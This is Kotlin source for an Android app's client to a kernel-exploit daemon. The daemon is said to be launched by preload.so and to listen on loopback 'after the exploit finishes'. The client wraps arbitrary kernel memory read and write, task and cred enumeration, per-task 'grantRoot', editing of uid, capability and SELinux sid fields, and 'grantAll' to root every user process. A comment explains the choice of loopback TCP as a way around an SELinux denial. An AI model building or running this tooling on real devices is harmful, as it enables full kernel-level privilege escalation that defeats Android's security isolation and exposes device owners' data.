package github.boxiaolanya2008.kernelapp

import java.io.IOException
import java.io.InputStream
import java.io.OutputStream
import java.net.InetSocketAddress
import java.net.Socket
import java.nio.ByteBuffer
import java.nio.ByteOrder
import java.nio.charset.StandardCharsets

/**
 * TCP client for the io daemon spawned by preload.so.
 *
 * The daemon listens on 127.0.0.1:39555 after the exploit finishes. Every call
 * opens a fresh connection, sends one binary request, reads the reply, and
 * closes. Protocol is little-endian. Loopback TCP avoids the SELinux
 * sock_file denial that blocks an untrusted_app from connecting to a unix
 * socket under /data/local/tmp.
 */
object KernelBridge {
    private const val HOST = "127.0.0.1"
    private const val PORT = 39555
    private const val CONNECT_TIMEOUT_MS = 3000
    private const val MAX_PAYLOAD = 8192

    private fun connect(): Socket {
        val sock = Socket()
        sock.connect(InetSocketAddress(HOST, PORT), CONNECT_TIMEOUT_MS)
        sock.tcpNoDelay = true
        return sock
    }

    private fun readFully(input: InputStream, buf: ByteArray): Boolean {
        var off = 0
        while (off < buf.size) {
            val n = input.read(buf, off, buf.size - off)
            if (n < 0) return false
            off += n
        }
        return true
    }

    private fun writeFully(output: OutputStream, buf: ByteArray): Boolean {
        return try {
            output.write(buf)
            output.flush()
            true
        } catch (e: IOException) {
            false
        }
    }

    private fun <T> withConn(block: (InputStream, OutputStream) -> T): T? {
        return try {
            connect().use { sock ->
                block(sock.getInputStream(), sock.getOutputStream())
            }
        } catch (e: IOException) {
            null
        }
    }

    /** Ping the daemon; true if it is reachable. */
    fun ping(): Boolean {
        val r = withConn { input, output ->
            writeFully(output, byteArrayOf('P'.code.toByte()))
            val reply = ByteArray(1)
            if (!readFully(input, reply)) return@withConn false
            reply[0] == 'p'.code.toByte()
        }
        return r ?: false
    }

    /** One-line status text from the daemon, or null if unreachable. */
    fun status(): String? {
        return withConn { input, output ->
            writeFully(output, byteArrayOf('S'.code.toByte()))
            val buf = ByteArray(512)
            val n = try {
                input.read(buf)
            } catch (e: IOException) {
                return@withConn null
            }
            if (n <= 0) return@withConn null
            val end = buf.indexOf(0)
            val len = if (end >= 0) end else n
            String(buf, 0, len, StandardCharsets.UTF_8)
        }
    }

    /** Read up to len bytes from a kernel virtual address. */
    fun kernelRead(target: Long, len: Int): ByteArray? {
        if (len <= 0 || len > MAX_PAYLOAD) return null
        return withConn { input, output ->
            val req = ByteBuffer.allocate(13).order(ByteOrder.LITTLE_ENDIAN)
            req.put('R'.code.toByte())
            req.putLong(target)
            req.putInt(len)
            if (!writeFully(output, req.array())) return@withConn null

            val nbuf = ByteArray(4)
            if (!readFully(input, nbuf)) return@withConn null
            val n = ByteBuffer.wrap(nbuf).order(ByteOrder.LITTLE_ENDIAN).int
            if (n <= 0 || n > MAX_PAYLOAD) return@withConn null

            val data = ByteArray(n)
            if (!readFully(input, data)) return@withConn null
            data
        }
    }

    fun kernelRead64(target: Long): Long {
        val data = kernelRead(target, 8) ?: return 0
        return ByteBuffer.wrap(data).order(ByteOrder.LITTLE_ENDIAN).long
    }

    fun kernelReadString(target: Long, maxLen: Int): String? {
        val data = kernelRead(target, maxLen) ?: return null
        val end = data.indexOf(0)
        val len = if (end >= 0) end else data.size
        return String(data, 0, len, StandardCharsets.UTF_8)
    }

    /** Write bytes to a kernel virtual address; true on success. */
    fun kernelWrite(target: Long, data: ByteArray): Boolean {
        if (data.size > MAX_PAYLOAD) return false
        val r = withConn { input, output ->
            val req = ByteBuffer.allocate(13 + data.size).order(ByteOrder.LITTLE_ENDIAN)
            req.put('W'.code.toByte())
            req.putLong(target)
            req.putInt(data.size)
            req.put(data)
            if (!writeFully(output, req.array())) return@withConn false
            val ok = ByteArray(1)
            if (!readFully(input, ok)) return@withConn false
            ok[0] == 1.toByte()
        }
        return r ?: false
    }

    fun kernelWrite64(target: Long, value: Long): Boolean {
        val buf = ByteBuffer.allocate(8).order(ByteOrder.LITTLE_ENDIAN)
        buf.putLong(value)
        return kernelWrite(target, buf.array())
    }

    data class TaskItem(
        val pid: Long,
        val tgid: Long,
        val task: Long,
        val cred: Long,
        val comm: String,
    )

    /** Fetch the task list from the daemon. */
    fun taskList(): List<TaskItem> {
        val r = withConn { input, output ->
            writeFully(output, byteArrayOf('T'.code.toByte()))

            val cntBuf = ByteArray(4)
            if (!readFully(input, cntBuf)) return@withConn emptyList<KernelBridge.TaskItem>()
            val count = ByteBuffer.wrap(cntBuf).order(ByteOrder.LITTLE_ENDIAN).int
            if (count <= 0 || count > 8192) return@withConn emptyList<KernelBridge.TaskItem>()

            val recSize = 4 + 4 + 8 + 8 + 16
            val raw = ByteArray(count * recSize)
            if (!readFully(input, raw)) return@withConn emptyList<KernelBridge.TaskItem>()

            val bb = ByteBuffer.wrap(raw).order(ByteOrder.LITTLE_ENDIAN)
            val list = ArrayList<TaskItem>(count)
            for (i in 0 until count) {
                val pid = bb.int.toLong() and 0xffffffffL
                val tgid = bb.int.toLong() and 0xffffffffL
                val task = bb.long
                val cred = bb.long
                val commBytes = ByteArray(16)
                bb.get(commBytes)
                val end = commBytes.indexOf(0)
                val commLen = if (end >= 0) end else 16
                list.add(
                    TaskItem(
                        pid = pid,
                        tgid = tgid,
                        task = task,
                        cred = cred,
                        comm = String(commBytes, 0, commLen, StandardCharsets.UTF_8),
                    )
                )
            }
            list
        }
        return r ?: emptyList()
    }

    /** Grant root to the task_struct at the given address. */
    fun grantRoot(taskAddr: Long): Boolean {
        val r = withConn { input, output ->
            val req = ByteBuffer.allocate(9).order(ByteOrder.LITTLE_ENDIAN)
            req.put('G'.code.toByte())
            req.putLong(taskAddr)
            if (!writeFully(output, req.array())) return@withConn false
            val ok = ByteArray(1)
            if (!readFully(input, ok)) return@withConn false
            ok[0] == 1.toByte()
        }
        return r ?: false
    }

    data class CredInfo(
        val uid: Long, val gid: Long, val suid: Long, val sgid: Long,
        val euid: Long, val egid: Long, val fsuid: Long, val fsgid: Long,
        val securebits: Long, val caps: LongArray, val sid: Long,
    )

    /** Dump the cred fields of the task at the given address. */
    fun credInfo(taskAddr: Long): CredInfo? {
        return withConn { input, output ->
            val req = ByteBuffer.allocate(9).order(ByteOrder.LITTLE_ENDIAN)
            req.put('C'.code.toByte())
            req.putLong(taskAddr)
            if (!writeFully(output, req.array())) return@withConn null

            val snap = ByteArray(8 * 4 + 4 + 5 * 8 + 4 + 4)
            if (!readFully(input, snap)) return@withConn null
            val bb = ByteBuffer.wrap(snap).order(ByteOrder.LITTLE_ENDIAN)
            val magic = bb.int
            if (magic != 0x43524544) return@withConn null
            val uid = bb.int.toLong() and 0xffffffffL
            val gid = bb.int.toLong() and 0xffffffffL
            val suid = bb.int.toLong() and 0xffffffffL
            val sgid = bb.int.toLong() and 0xffffffffL
            val euid = bb.int.toLong() and 0xffffffffL
            val egid = bb.int.toLong() and 0xffffffffL
            val fsuid = bb.int.toLong() and 0xffffffffL
            val fsgid = bb.int.toLong() and 0xffffffffL
            val securebits = bb.int.toLong() and 0xffffffffL
            val caps = LongArray(5) { bb.long }
            val sid = bb.int.toLong() and 0xffffffffL
            CredInfo(uid, gid, suid, sgid, euid, egid, fsuid, fsgid,
                     securebits, caps, sid)
        }
    }

    /** Modify one cred field. field: 0=ids, 1=securebits, 2=caps, 3=sid. */
    fun modifyCredField(taskAddr: Long, field: Int, value: Long): Boolean {
        val r = withConn { input, output ->
            val req = ByteBuffer.allocate(9 + 4 + 4 + 8).order(ByteOrder.LITTLE_ENDIAN)
            req.put('M'.code.toByte())
            req.putLong(taskAddr)
            req.putInt(field)
            req.putInt(0)
            req.putLong(value)
            if (!writeFully(output, req.array())) return@withConn false
            val ok = ByteArray(1)
            if (!readFully(input, ok)) return@withConn false
            ok[0] == 1.toByte()
        }
        return r ?: false
    }

    data class GrantAllResult(val granted: Int, val skipped: Int)

    /** Grant root to all user-space tasks (kernel threads skipped). */
    fun grantAll(): GrantAllResult? {
        return withConn { input, output ->
            writeFully(output, byteArrayOf('A'.code.toByte()))
            val rep = ByteArray(8)
            if (!readFully(input, rep)) return@withConn null
            val bb = ByteBuffer.wrap(rep).order(ByteOrder.LITTLE_ENDIAN)
            GrantAllResult(bb.int, bb.int)
        }
    }
}
